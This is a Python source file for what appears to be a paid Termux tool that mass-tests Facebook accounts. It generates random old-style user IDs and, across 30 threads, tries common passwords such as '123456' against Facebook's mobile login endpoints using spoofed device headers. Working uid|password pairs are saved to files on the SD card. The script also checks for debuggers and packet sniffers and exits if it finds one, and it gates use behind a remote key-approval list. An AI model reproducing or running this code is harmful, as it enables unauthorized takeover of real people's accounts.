# -*- coding: utf-8 -*-
import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime

# Attempt to import necessary modules, installing them if they don't exist
modules = ['requests', 'urllib3', 'mechanize', 'rich']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f'pip install {module}')

from requests.exceptions import ConnectionError
from requests import api, models, sessions
requests.urllib3.disable_warnings()
os.system('clear')
os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
os.system('pip install httpx pip install beautifulsoup4')
print('loading Modules ...\n')
os.system('clear')
 
try:
    api_body = open(api.__file__, 'r').read()
    models_body = open(models.__file__, 'r').read()
    session_body = open(sessions.__file__, 'r').read()
    word_list = ['print', 'lambda', 'zlib.decompress']
    for word in word_list:
        if word in api_body or word in models_body or word in session_body:
            exit()
except:
    pass

# --- Anti-Debugging Class ---
# This class contains further checks to see if the script is being analyzed.
class sec:
    """A security class to detect debugging and packet sniffing tools."""

    def __init__(self):
        # Checks if 'print' has been injected into requests library files
        paths = [
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py'
        ]
        for path in paths:
            if 'print' in open(path, 'r').read():
                self.fuck()
        
        # Checks for the presence of HTTP Canary, a packet sniffing app
        if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png'):
            self.fuck()
        if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
            self.fuck()
            
    def fuck(self):
        """Prints a message and exits if tampering is detected."""
        print(' \x1b[1;32m Congratulations ! ')
        self.linex()
        exit()

    def linex(self):
        print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

# --- Global Variables ---
method = []
oks = []
cps = []
loop = 0
user = []

# --- ANSI Color Codes ---
X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W = '\x1b[1;37m'
red = '\x1b[38;5;196m'
green = '\x1b[38;5;46m'
white = '\x1b[1;37m'
yellow = '\x1b[38;5;226m'

# --- User-Agent Generators ---
# These functions generate randomized User-Agent strings to mimic browsers.
def windows():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f"5{bx}.{bV}"
    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f"5{cx}.{cV}"
    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
    return random.choice([A, B, C, D])
def window1():
	A = "Dalvik/2.1.0 (Linux; U; Android 8.1.0;CPH1803 Build/OPM1.171019.026)[FBAN/Orca- Android;FBAV/275.0.0.20.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/234764319;FBCR/TNT;FBMF/OPPO;FBDV/CPH1803;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1424};FB_FW/1;]"
	B = "Mozilla/5.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36 Dalvik/1.6.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/AndroidSampleApp;FBAV/148.0.051.62;FBLC/id_ID;FBBV/4084560;FBCR/Telkomsel;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.3312501,width=375,height=812};FB_FW/1;]"
	return random.choice([A,B])










def window1():
	
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f"5{bx}.{bV}"
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f"5{cx}.{cV}"
    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D])

# --- Helper Functions ---
def clear():
    os.system('clear')

def linex():
    print(f'{red}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

def banner():
    clear()
    logo = "".join([
        """
\n /$$$$$ /$$$$$$ /$$$$$$$   /$$$$$$  /$$   /$$
   |__  $$|_  $$_/| $$__  $$ /$$__  $$| $$$ | $$
      | $$  | $$  | $$  \ $$| $$  \ $$| $$$$| $$
      | $$  | $$  | $$$$$$$ | $$  | $$| $$ $$ $$
 /$$  | $$  | $$  | $$__  $$| $$  | $$| $$  $$$$
| $$  | $$  | $$  | $$  \ $$| $$  | $$| $$\  $$$
|  $$$$$$/ /$$$$$$| $$$$$$$/|  $$$$$$/| $$ \  $$
 \______/ |______/|_______/  \______/ |__/  \__/n""",
        f"{white}───────────────────────────────────────\n",
        f"{red}|{white}={red}|{green} DEVELOPER {white}: {green}︎Jibon\n",
        f"{red}|{white}={red}|{green} TOOLTYPE {white} : {green}Paid {red}({green}OLD{white} {green}CLONE{red})\n",
        f"{red}|{white}={red}|{green} VERSION   {white}: {white}︎v1.0\n",
        f"{red}|{white}={red}|{green} Contact Wp   {white}: {white}︎+8801924599795",
        f"{white}───────────────────────────────────────\n"
    ])
    print(logo)
    

# --- UID Creation Year Guesser ---
def creationyear(uid):
    if len(uid) == 15:
        if uid.startswith('1000000000'): return '2009'
        if uid.startswith('100000000'): return '2009'
        if uid.startswith('10000000'): return '2009'
        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')): return '2009'
        if uid.startswith(('1000006', '1000007', '1000008', '1000009')): return '2010'
        if uid.startswith('100001'): return '2010'
        if uid.startswith(('100002', '100003')): return '2011'
        if uid.startswith('100004'): return '2012'
        if uid.startswith(('100005', '100006')): return '2013'
        if uid.startswith(('100007', '100008')): return '2014'
        if uid.startswith('100009'): return '2015'
        if uid.startswith('10001'): return '2016'
        if uid.startswith('10002'): return '2017'
        if uid.startswith('10003'): return '2018'
        if uid.startswith('10004'): return '2019'
        if uid.startswith('10005'): return '2020'
        if uid.startswith('10006'): return '2021'
        if uid.startswith('10009'): return '2023'
        if uid.startswith(('10007', '10008')): return '2022'
        return ''
    elif len(uid) in (9, 10): return '2008'
    elif len(uid) == 8: return '2007'
    elif len(uid) == 7: return '2006'
    elif len(uid) == 14 and uid.startswith('61'): return '2024'
    else: return ''

# --- Main Menu and Logic ---
def BNG_71_():
    banner()
    print(f'{red}|{white}1{red}|{green} OLD CLONE V3')
    print(f'{red}|{white}2{red}|{green} EXIT TOOL')
    linex()
    Jihad = input(f'{red}|{white}?{red}|{green} CHOICE {white}: {green}').strip()
    
    if Jihad in ('A', 'a', '01', '1'):
        old_clone()
    elif Jihad in ('B', 'b', '02', '2'):
        print(f'\n{red}|{white}!{red}|{green} THANKS FOR USING TOOL... BYE! 👋')
        time.sleep(1)
        sys.exit()
    else:
        print(f'\n{red}|{white}!{red}|{green} Choose Valid Option... ')
        time.sleep(2)
        BNG_71_()

def old_clone():
    banner()
    print(f'{red}|{white}A{red}|{green} ALL SERIES')
    linex()
    print(f'{red}|{white}B{red}|{green} 100003/4 SERIES')
    linex()
    print(f'{red}|{white}C{red}|{green} 2009 SERIES')
    linex()
    _input = input(f'{red}|{white}?{red}|{green} CHOICE {white}: {green}').strip()

    if _input in ('A', 'a', '01', '1'): old_One()
    elif _input in ('B', 'b', '02', '2'): old_Two()
    elif _input in ('C', 'c', '03', '3'): old_Three()
    else:
        print(f'\n{red}|{white}!{red}|{green} Choose Valid Option... ')
        time.sleep(2)
        old_clone()

# --- UID Generation and Cracking Functions ---
def old_One():
    user = []
    banner()
    print(f'{red}|{white}={red}|{green} OLD CLONE CODE {yellow}: {green}2010-2014')
    ask = input(f'{red}|{white}?{red}|{green} SELECT {yellow}: {green}')
    linex()
    banner()
    print(f'{red}|{white}={red}|{green} EXAMPLE {yellow}: {green}20000 / 30000 / 99999')
    limit = input(f'{red}|{white}?{red}|{green} SELECT {yellow}: {green}')
    linex()

    star = '10000'
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
        user.append(data)
    
    print(f'{red}|{white}A{red}|{green} METHOD 1')
    print(f'{red}|{white}B{red}|{green} METHOD 2')
    linex()
    meth = input(f'{red}|{white}?{red}|{green} CHOICE {white}(A/B): {green}').strip().upper()
    
    with tred(max_workers=30) as pool:
        banner()
        print(f'{red}|{white}={red}|{green} TOTAL ID FROM CRACK {yellow}: {green}{limit}{white}')
        print(f'{red}|{white}={red}|{green} USE AIRPLANE MOD FOR GOOD RESULT{green}')
        linex()
        for mal in user:
            uid = star + mal
            if meth == 'A': pool.submit(login_1, uid)
            elif meth == 'B': pool.submit(login_2, uid)
            else: print(f'{red}|{white}!{red}|{green} INVALID METHOD SELECTED'); break

def old_Two():
    user = []
    banner()
    print(f'{red}|{white}={red}|{green} OLD CODE {yellow}: {green}2010-2014')
    ask = input(f'{red}|{white}?{red}|{green} SELECT {yellow}: {green}')
    linex()
    banner()
    print(f'{red}|{white}={red}|{green} EXAMPLE {yellow}: {green}20000 / 30000 / 99999')
    limit = input(f'{red}|{white}?{red}|{green} SELECT {yellow}: {green}')
    linex()
    
    prefixes = ['100003', '100004']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = "".join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
        
    print(f'{red}|{white}A{red}|{green} METHOD A')
    print(f'{red}|{white}B{red}|{green} METHOD B')
    linex()
    meth = input(f'{red}|{white}?{red}|{green} CHOICE {white}(A/B): {green}').strip().upper()
    
    with tred(max_workers=30) as pool:
        banner()
        print(f'{red}|{white}={red}|{green} TOTAL ID FROM CRACK {yellow}: {green}{limit}{white}')
        print(f'{red}|{white}={red}|{green} USE AIRPLANE MOD FOR GOOD RESULT{green}')
        linex()
        for uid in user:
            if meth == 'A': pool.submit(login_1, uid)
            elif meth == 'B': pool.submit(login_2, uid)
            else: print(f'{red}|{white}!{red}|{green} INVALID METHOD SELECTED'); break

def old_Three():
    user = []
    banner()
    print(f'{red}|{white}={red}|{green} OLD CODE {yellow}: {green}2009-2010')
    ask = input(f'{red}|{white}?{red}|{green} SELECT {yellow}: {green}')
    linex()
    banner()
    print(f'{red}|{white}={red}|{green} EXAMPLE {yellow}: {green}20000 / 30000 / 99999')
    limit = input(f'{red}|{white}?{red}|{green} TOTAL ID COUNT {yellow}: {green}')
    linex()
    
    prefix = '1000004'
    for _ in range(int(limit)):
        suffix = "".join(random.choices('0123456789', k=8))
        uid = prefix + suffix
        user.append(uid)

    print(f'{red}|{white}A{red}|{green} METHOD A')
    print(f'{red}|{white}B{red}|{green} METHOD B')
    linex()
    meth = input(f'{red}|{white}?{red}|{green} CHOICE {white}(A/B): {green}').strip().upper()
    
    with tred(max_workers=30) as pool:
        banner()
        print(f'{red}|{white}={red}|{green} TOTAL ID FROM CRACK {yellow}: {green}{limit}{white}')
        print(f'{red}|{white}={red}|{green} USE AIRPLANE MOD FOR GOOD RESULT{green}')
        linex()
        for uid in user:
            if meth == 'A': pool.submit(login_1, uid)
            elif meth == 'B': pool.submit(login_2, uid)
            else: print(f'{red}|{white}!{red}|{green} INVALID METHOD SELECTED'); break

# --- Login Attempt Functions ---
def login_1(uid):
    global loop
    try:
        session = requests.session()
        sys.stdout.write(f'\r\r{red}|{green}LammimCRACK{red}|{green} {loop} {white}| {green}OK {white}| {red}{len(oks)}{white}')
        sys.stdout.flush()
        
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()),
                'cpl': 'true', 'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled', 'source': 'device_based_login',
                'email': str(uid), 'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1', 'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()), 'currently_logged_in_userid': '0',
                'locale': 'en_US', 'client_country_code': 'US',
                'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(), 'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '25227', 'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;', 'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            
            if 'session_key' in res:
                print(f'\r\r\x1b[38;5;46m|LSSUCCESS| {uid} | {pw} | {creationyear(uid)}')
                open('/sdcard/LS-OLD-SUCCESS-OK.txt', 'a').write(f'{uid}|{pw}\n')
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f'\r\r\x1b[38;5;46m|LS| {uid} | {pw} | {creationyear(uid)}')
                open('/sdcard/LS-OLD-LIVE-OK.txt', 'a').write(f'{uid}|{pw}\n')
                oks.append(uid)
                break
    except Exception:
        time.sleep(5)
    loop += 1

def login_2(uid):
    global loop
    try:
        sys.stdout.write(f'\r\r{red}|{green}LSCRACK{red}|{green} {loop} {white}| {green}OK {white}| {red}{len(oks)}{white}')
        
        for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
            with requests.Session() as session:
                headers = {
                    'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
                    'x-fb-sim-hni': str(rr(20000, 40000)),
                    'x-fb-net-hni': str(rr(20000, 40000)),
                    'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                    'user-agent': window1(),
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger'
                }
                url = (f'https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}'
                       f'&password={str(pw)}&credentials_type=device_based_login_password'
                       '&generate_session_cookies=1&error_detail_type=button_with_disabled'
                       '&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0'
                       '&method=GET&locale=en_US&client_country_code=US'
                       '&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler'
                       '&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                       '&fb_api_req_friendly_name=authenticate&cpl=true')
                
                po = session.get(url, headers=headers).json()
                
                if 'session_key' in str(po):
                    print(f'\r\r\x1b[38;5;46m|LSSUCCESS| {uid} | {pw} | {creationyear(uid)}')
                    open('/sdcard/LS-OLD-SUCCESS-OK.txt', 'a').write(f'{uid}|{pw}\n')
                    oks.append(uid)
                    break
    except Exception as e:
        pass
    loop += 1


#---------------------Approvel
    import os
K1=str(os.getuid())
K2=str(os.getgid())
num_key="AC".join(K1+K2).upper()
from io import BytesIO
import pycurl,certifi
def apv():
    url="https://raw.githubusercontent.com/JI725/Jibon.Xhowdhory45/refs/heads/main/Apparvl.txt"
    try:
        buffer = BytesIO()
        curl = pycurl.Curl()
        curl.setopt(curl.URL, url)
        curl.setopt(curl.WRITEDATA, buffer)
        curl.setopt(curl.CAINFO, certifi.where())
        curl.perform()
        curl.close()
        datax=buffer.getvalue().decode('utf-8')
    except Exception as e:
        print(e)
        sys.exit("[!!] Internet Error...")
    if num_key in datax:
        BNG_71_()
    else:
        os.system("clear")
        banner()
        linex()
        print(" [✓] Key Not Approved")
        print(" !! Key - "+num_key)
        os.system("xdg-open https://www.facebook.com/lsdigitalgrowth)
        sys.exit()


apv()



# --- Entry Point ---
if __name__ == '__main__':
    BNG_71_()